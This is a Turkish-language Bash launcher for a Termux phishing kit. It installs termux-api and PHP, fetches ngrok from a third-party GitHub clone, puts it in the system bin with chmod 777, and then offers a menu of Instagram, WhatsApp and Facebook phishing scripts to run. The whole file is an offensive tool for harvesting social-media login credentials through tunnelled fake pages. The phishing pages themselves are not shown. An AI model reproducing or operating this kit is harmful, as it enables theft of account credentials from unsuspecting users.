#!/bin/bash
clear
#################### TERMUX-APİ ####################
kontrol=$(which termux-notification |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mTERMUX-APİ PAKETİ YÜKLENİYOR "
	echo
	echo
	echo
	pkg install termux-api -y
fi
#################### PHP ####################
kontrol=$(which php |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ YÜKLENİYOR "
	echo
	echo
	echo
	pkg install php -y
fi

#################### NGROK ####################
kontrol=$(which ngrok |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termux-egitim/ngrok
	mv ngrok/ngrok /data/data/com.termux/files/usr/bin
	chmod 777 /data/data/com.termux/files/usr/bin/ngrok
	rm -rf ngrok
fi


if [[ $1 == güncelle ]];then
	cd files
	bash güncelleme.sh güncelle
	exit
fi
clear
cd files
bash güncelleme.sh
bash banner.sh
cd ..
printf "
\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mİNSTAGRAM PHİSHİNG\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mWHATSAPP PHİSHİNG\e[97m

\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mFACEBOOK PHİSHİNG\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd files/instagram
	bash instagram_phishing.sh
elif [[ $secim == 2 ]];then
	cd files/whatsapp
	bash whatsapp_phishing.sh
elif [[ $secim == 3 ]];then
	cd files/facebook
	bash facebook_phishing.sh
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM"
	echo
	echo
	echo
	sleep 2
	bash phishing_attack.sh
fi

